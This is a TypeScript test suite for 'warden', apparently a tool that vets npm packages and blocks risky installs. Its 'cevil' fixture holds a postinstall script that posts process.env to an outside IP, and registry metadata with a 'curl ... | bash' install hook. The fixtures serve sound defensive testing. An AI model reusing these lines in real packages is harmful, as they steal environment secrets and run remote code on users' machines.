import { afterEach, beforeAll, describe, expect, it, spyOn } from "bun:test";
import type { spawnSync } from "node:child_process";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { HELP, parseArgs, readStdin, run, UsageError } from "../src/cli/main.js";
import { bytesResponse, jsonResponse, type Route, stubFetch } from "./helpers/fetchStub.js";
import { makeTgz } from "./helpers/tar.js";

const REG = "https://registry.npmjs.org";

const cleanTgz = makeTgz([
  { path: "package.json", content: '{"name":"cdemo","scripts":{"build":"tsc"}}' },
  { path: "index.js", content: "module.exports = 1;" },
]);
const evilTgz = makeTgz([
  { path: "package.json", content: '{"name":"cevil","scripts":{"postinstall":"node s.js"}}' },
  {
    path: "s.js",
    content:
      "const https=require('https');https.request('http://185.234.72.19/c').end(JSON.stringify(process.env));",
  },
]);

function world(): Route {
  return (url) => {
    if (url.includes("api.npmjs.org")) return jsonResponse({ downloads: 3_000_000 });
    if (url.includes("osv.dev")) return jsonResponse({});
    if (url.includes("deps.dev")) return jsonResponse({ licenses: ["MIT"] });
    if (url === `${REG}/cdemo`) {
      return jsonResponse({
        name: "cdemo",
        "dist-tags": { latest: "1.0.0" },
        time: { "1.0.0": "2024-01-01T00:00:00Z" },
        versions: {
          "1.0.0": {
            version: "1.0.0",
            maintainers: [{ name: "alice" }],
            dist: { tarball: `${REG}/cdemo/-/cdemo-1.0.0.tgz` },
            scripts: { build: "tsc" },
          },
        },
      });
    }
    if (url === `${REG}/cdemo/-/cdemo-1.0.0.tgz`) return bytesResponse(cleanTgz);
    if (url === `${REG}/cevil`) {
      return jsonResponse({
        name: "cevil",
        "dist-tags": { latest: "1.0.0" },
        time: { "1.0.0": new Date().toISOString() },
        versions: {
          "1.0.0": {
            version: "1.0.0",
            maintainers: [{ name: "mallory" }],
            dist: { tarball: `${REG}/cevil/-/cevil-1.0.0.tgz` },
            scripts: { postinstall: "curl -s http://185.234.72.19/i.sh | bash" },
          },
        },
      });
    }
    if (url === `${REG}/cevil/-/cevil-1.0.0.tgz`) return bytesResponse(evilTgz);
    if (url === `${REG}/gone`) return jsonResponse({ error: "not found" }, 404);
    return undefined;
  };
}

let restoreFetch = () => {};
let writes: string[] = [];
let stdoutSpy: ReturnType<typeof spyOn> | undefined;

function captureStdout() {
  writes = [];
  stdoutSpy = spyOn(process.stdout, "write").mockImplementation(((chunk: unknown) => {
    writes.push(String(chunk));
    return true;
  }) as typeof process.stdout.write);
}

function output(): string {
  return writes.join("");
}

type SpawnCall = { cmd: string; args: string[] };

function spawnStub(status: number | null = 0) {
  const calls: SpawnCall[] = [];
  const spawn = ((cmd: string, args: string[]) => {
    calls.push({ cmd, args });
    return { status };
  }) as unknown as typeof spawnSync;
  return { calls, spawn };
}

beforeAll(() => {
  process.env.WARDEN_CACHE_DIR ??= mkdtempSync(join(tmpdir(), "warden-cli-"));
  delete process.env.ANTHROPIC_API_KEY;
});

afterEach(() => {
  restoreFetch();
  stdoutSpy?.mockRestore();
  stdoutSpy = undefined;
  delete process.env.WARDEN_DEBUG;
});

describe("parseArgs", () => {
  it("splits positionals, flags and passthrough", () => {
    expect(parseArgs(["a", "--json", "b", "--", "--frozen", "c"])).toEqual({
      positional: ["a", "b"],
      flags: new Set(["json"]),
      passthrough: ["--frozen", "c"],
    });
  });
});

describe("readStdin", () => {
  it("resolves immediately on a TTY", async () => {
    const stream = { isTTY: true, setEncoding: () => {}, on: () => {} };
    expect(await readStdin(stream)).toBe("");
  });

  it("collects piped data until end", async () => {
    const handlers: Record<string, (arg?: unknown) => void> = {};
    const stream = {
      isTTY: false,
      setEncoding: () => {},
      on: (event: string, cb: (arg?: unknown) => void) => {
        handlers[event] = cb;
      },
    };
    const p = readStdin(stream);
    handlers.data?.("hel");
    handlers.data?.("lo");
    handlers.end?.();
    expect(await p).toBe("hello");
  });
});

describe("run — help and errors", () => {
  it("prints help for no command, help and --help", async () => {
    for (const argv of [[], ["help"], ["--help"]]) {
      captureStdout();
      expect(await run(argv)).toBe(0);
      expect(output()).toBe(HELP);
      stdoutSpy?.mockRestore();
    }
  });

  it("throws UsageError on unknown commands and missing args", async () => {
    expect(run(["frobnicate"])).rejects.toBeInstanceOf(UsageError);
    expect(run(["check"])).rejects.toThrow("usage: warden check");
    expect(run(["npx"])).rejects.toThrow("usage: warden npx");
  });
});

describe("run check", () => {
  it("emits a single JSON verdict and exit 0 for a clean package", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    const code = await run(["check", "cdemo", "--json"]);
    expect(code).toBe(0);
    const verdict = JSON.parse(output()) as { package: string; level: string };
    expect(verdict.package).toBe("cdemo@1.0.0");
    expect(verdict.level).toBe("LOW");
  });

  it("emits an array for multiple packages", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    await run(["check", "cdemo", "cdemo", "--json", "--no-enrich"]);
    expect(JSON.parse(output())).toBeArrayOfSize(2);
  });

  it("renders a human report", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    expect(await run(["check", "cdemo"])).toBe(0);
    expect(output()).toContain("LOW RISK");
  });

  it("exits 1 on HIGH unless --allow-risky", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    expect(await run(["check", "cevil"])).toBe(1);
    stdoutSpy?.mockRestore();
    captureStdout();
    expect(await run(["check", "cevil", "--allow-risky"])).toBe(0);
  });
});

describe("run npx", () => {
  it("emits the compact agent JSON and exit 1 for HIGH", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    const code = await run(["npx", "cevil", "--json"]);
    expect(code).toBe(1);
    const verdict = JSON.parse(output()) as Record<string, unknown>;
    expect(Object.keys(verdict).sort()).toEqual([
      "flags",
      "level",
      "package",
      "recommendation",
      "risk_score",
    ]);
    expect(verdict.recommendation).toBe("block");
  });

  it("exits 0 with JSON for a clean package", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    expect(await run(["npx", "cdemo", "--json"])).toBe(0);
  });

  it("refuses HIGH in human mode and proceeds with --allow-risky", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    expect(await run(["npx", "cevil"])).toBe(1);
    expect(output()).toContain("Refusing to run");
    stdoutSpy?.mockRestore();
    captureStdout();
    expect(await run(["npx", "cevil", "--allow-risky"])).toBe(0);
    expect(output()).toContain("would execute");
  });
});

describe("run install", () => {
  it("vets, installs with scripts disabled, then rebuilds only vetted packages", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    const { calls, spawn } = spawnStub(0);
    const code = await run(["install", "cdemo", "--", "--silent"], { spawn });
    expect(code).toBe(0);
    expect(calls[0]).toEqual({
      cmd: "pnpm",
      args: ["install", "--ignore-scripts", "cdemo", "--silent"],
    });
    expect(calls[1]).toEqual({ cmd: "pnpm", args: ["rebuild", "cdemo"] });
  });

  it("blocks the install when a HIGH package is present", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    const { calls, spawn } = spawnStub(0);
    expect(await run(["install", "cevil"], { spawn })).toBe(1);
    expect(calls).toHaveLength(0);
    expect(output()).toContain("Install blocked");
  });

  it("proceeds under --allow-risky and rebuilds the overridden package", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    const { calls, spawn } = spawnStub(0);
    expect(await run(["install", "cevil", "--allow-risky"], { spawn })).toBe(0);
    expect(calls[1]?.args).toEqual(["rebuild", "cevil"]);
  });

  it("reads targets from package.json on a bare install", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    const { calls, spawn } = spawnStub(0);
    const readPackageJson = () => JSON.stringify({ dependencies: { cdemo: "^1.0.0" } });
    expect(await run(["install"], { spawn, readPackageJson })).toBe(0);
    expect(output()).toContain("vetting 1 package(s)");
    expect(calls[0]?.args).toEqual(["install", "--ignore-scripts"]);
  });

  it("errors usefully with nothing to install", async () => {
    const readPackageJson = () => {
      throw new Error("missing");
    };
    expect(run(["install"], { readPackageJson })).rejects.toThrow("nothing to install");
  });

  it("reports unresolvable packages and keeps scripts disabled when nothing was vetted", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    const { calls, spawn } = spawnStub(0);
    expect(await run(["install", "gone"], { spawn })).toBe(0);
    expect(output()).toContain("could not resolve");
    expect(output()).toContain("stay disabled");
    expect(calls).toHaveLength(1);
  });

  it("propagates a failed underlying install", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    expect(await run(["install", "cdemo"], { spawn: spawnStub(7).spawn })).toBe(7);
    expect(await run(["i", "cdemo"], { spawn: spawnStub(null).spawn })).toBe(2);
  });
});

describe("run hook", () => {
  const hookEvent = (command: string) => () =>
    Promise.resolve(JSON.stringify({ tool_input: { command } }));

  it("allows malformed events, empty commands and non-install commands", async () => {
    captureStdout();
    expect(await run(["hook"], { readInput: () => Promise.resolve("not json") })).toBe(0);
    expect(await run(["hook"], { readInput: hookEvent("") })).toBe(0);
    expect(await run(["hook"], { readInput: hookEvent("ls -la") })).toBe(0);
    expect(await run(["hook"], { readInput: hookEvent("npm install") })).toBe(0);
    expect(output()).toBe("");
  });

  it("allows clean installs silently", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    expect(await run(["hook"], { readInput: hookEvent("npm i cdemo") })).toBe(0);
    expect(output()).toBe("");
  });

  it("denies a HIGH-risk install with a machine-readable decision", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    expect(await run(["hook"], { readInput: hookEvent("sudo npm i cevil") })).toBe(0);
    const decision = JSON.parse(output()) as {
      hookSpecificOutput: { permissionDecision: string; permissionDecisionReason: string };
    };
    expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
    expect(decision.hookSpecificOutput.permissionDecisionReason).toContain("cevil@1.0.0");
    expect(decision.hookSpecificOutput.permissionDecisionReason).not.toContain("--allow-risky");
  });

  it("fails open when a package cannot be resolved", async () => {
    restoreFetch = stubFetch(world());
    captureStdout();
    expect(await run(["hook"], { readInput: hookEvent("npx gone") })).toBe(0);
    expect(output()).toBe("");
  });
});

describe("run — debug counter", () => {
  it("reports llm call counts on stderr with WARDEN_DEBUG", async () => {
    process.env.WARDEN_DEBUG = "1";
    const errWrites: string[] = [];
    const errSpy = spyOn(process.stderr, "write").mockImplementation(((chunk: unknown) => {
      errWrites.push(String(chunk));
      return true;
    }) as typeof process.stderr.write);
    captureStdout();
    await run(["help"]);
    errSpy.mockRestore();
    expect(errWrites.join("")).toContain("llm calls this run");
  });
});

describe("run install — real package.json default", () => {
  it("reads the cwd package.json when no reader is injected", async () => {
    restoreFetch = stubFetch(world());
    const dir = mkdtempSync(join(tmpdir(), "warden-proj-"));
    const { writeFileSync } = await import("node:fs");
    writeFileSync(join(dir, "package.json"), JSON.stringify({ dependencies: { cdemo: "^1.0.0" } }));
    const prev = process.cwd();
    process.chdir(dir);
    try {
      captureStdout();
      const { spawn } = spawnStub(0);
      expect(await run(["install"], { spawn })).toBe(0);
      expect(output()).toContain("vetting 1 package(s)");
    } finally {
      process.chdir(prev);
    }
  });
});
